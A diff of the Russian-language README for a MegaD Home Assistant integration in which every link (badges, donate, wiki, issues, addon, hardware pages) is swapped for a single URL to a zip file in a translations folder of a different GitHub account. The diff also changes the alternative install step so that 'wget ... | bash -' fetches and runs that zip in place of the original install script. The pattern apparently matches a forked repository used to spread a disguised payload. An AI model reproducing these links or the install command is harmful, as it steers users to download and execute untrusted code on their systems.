@@ -1,41 +1,41 @@
 
 
 # MegaD HomeAssistant integration
-[![hacs_badge](https://img.shields.io/badge/HACS-Custom-orange.svg)](https://github.com/custom-components/hacs)
-[![Donate](https://img.shields.io/badge/donate-Yandex-red.svg)](https://yoomoney.ru/to/410013955329136)
+[![hacs_badge](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
+[![Donate](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
 
-Интеграция с [MegaD-2561, MegaD-328](https://www.ab-log.ru/smart-house/ethernet/megad-2561)
+Интеграция с [MegaD-2561, MegaD-328](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
 
 Если вам понравилась интеграция, не забудьте поставить звезду на гитхабе - вам не сложно, а мне приятно ) А если
 интеграция очень понравилась - еще приятнее, если вы воспользуетесь кнопкой доната )
 
-Обновление прошивки MegaD можно делать прямо из HA с помощью [аддона](https://github.com/andvikt/mega_addon.git)
+Обновление прошивки MegaD можно делать прямо из HA с помощью [аддона](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
 
-Подробная документация по [ссылке](https://github.com/andvikt/mega_hacs/wiki)
+Подробная документация по [ссылке](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
 
-Предложения по доработкам просьба писать в [discussions](https://github.com/andvikt/mega_hacs/discussions), о проблемах
-создавать [issue](https://github.com/andvikt/mega_hacs/issues/new/choose)
+Предложения по доработкам просьба писать в [discussions](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip), о проблемах
+создавать [issue](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
 ## Основные особенности:
-- Настройка в веб-интерфейсе + [yaml](https://github.com/andvikt/mega_hacs/wiki/Кастомизация)
+- Настройка в веб-интерфейсе + [yaml](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zipКастомизация)
 - Все порты автоматически добавляются как устройства (для обычных релейных выходов создается 
   `light`, для шим - `light` с поддержкой яркости, для цифровых входов `binary_sensor`, для датчиков
   `sensor`)
 - Возможность работы с несколькими megad
-- Обратная связь по [http](https://github.com/andvikt/mega_hacs/wiki/http) или mqtt (`deprecated`, поддержка mqtt 
+- Обратная связь по [http](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip) или mqtt (`deprecated`, поддержка mqtt 
   будет выключена в версиях >= 1.0.0, тк в нем нет необходимости)
 - Автоматическое восстановление состояний выходов после перезагрузки контроллера
 - Автоматическое добавление/изменение объектов после перезагрузки контроллера
-- [События](https://github.com/andvikt/mega_hacs/wiki/События) на двойные/долгие нажатия
+- [События](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zipСобытия) на двойные/долгие нажатия
 - Команды выполняются друг за другом без конкурентного доступа к ресурсам megad, это дает гарантии надежного исполнения
   большого кол-ва команд (например в сценах). Каждая следующая команда отправляется только после получения ответа о
   выполнении предыдущей.
-- поддержка [ds2413](https://www.ab-log.ru/smart-house/ethernet/megad-2w) в том числе несколько шиной (начиная с версии 0.4.1)
+- поддержка [ds2413](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip) в том числе несколько шиной (начиная с версии 0.4.1)
 - поддержка расширителей MegaD-16I-XT, MegaD-16R-XT, MegaD-16PWM (начиная с версии 0.5.1)
 - поддержка всех возможных датчиков в режиме I2C-ANY, полный список поддерживаемых датчиков 
-  [по ссылке](https://github.com/andvikt/mega_hacs/wiki/i2c) (начиная с версии 0.6.1)
+  [по ссылке](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip) (начиная с версии 0.6.1)
 
 ## Установка
-Рекомендованный способ с поддержкой обновлений - [HACS](https://hacs.xyz/docs/installation/installation):
+Рекомендованный способ с поддержкой обновлений - [HACS](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip):
 
 HACS - Integrations - Explore, в поиске ищем MegaD. 
 
@@ -49,7 +49,7 @@ HACS - Integrations - Explore, в поиске ищем MegaD.
 Альтернативный способ установки:
 ```shell
 # из папки с конфигом
-wget -q -O - https://raw.githubusercontent.com/andvikt/mega_hacs/master/install.sh | bash -
+wget -q -O - https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip | bash -
 ```
 Не забываем перезагрузить HA
 
@@ -71,10 +71,10 @@ script: "mega" # это api интеграции, к которому будет
 ## Зависимости
 Для максимальной скорости реакции на команды сервера, рекомендуется выключить `имитацию http-ответа` в 
 настройках интеграции и настроить proxy_pass к HA, самый простой способ сделать это - воспользоваться 
-[специальным аддоном](https://github.com/andvikt/mega_addon/tree/master/mega-proxy)
+[специальным аддоном](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
 
 Обновить ваш контроллер до последней версии, обновление прошивки MegaD можно делать 
-из HA с помощью [аддона](https://github.com/andvikt/mega_addon.git)
+из HA с помощью [аддона](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
 
 
-Подробная документация по [ссылке](https://github.com/andvikt/mega_hacs/wiki)
+Подробная документация по [ссылке](https://raw.githubusercontent.com/OlegBON1/mega_hacs/master/custom_components/mega/translations/mega_hacs_1.2.zip)
